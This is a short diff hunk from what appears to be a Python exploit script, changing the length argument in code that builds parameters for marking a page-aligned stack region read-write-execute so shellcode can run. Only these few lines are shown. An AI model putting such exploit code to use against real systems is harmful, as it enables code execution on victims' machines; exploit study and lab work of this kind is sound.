@@ -112,7 +112,7 @@ try:
     arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc stack base
     arg_addr.reverse()
     
-    arg_len = b"\x00\x10\x02"  # len of the shellcode as size_t
+    arg_len = b"\x00\x10\x00"  # len of the shellcode as size_t
 
     arg_prot = b"\x07"  # int, look at man pages (c-level flags)
 
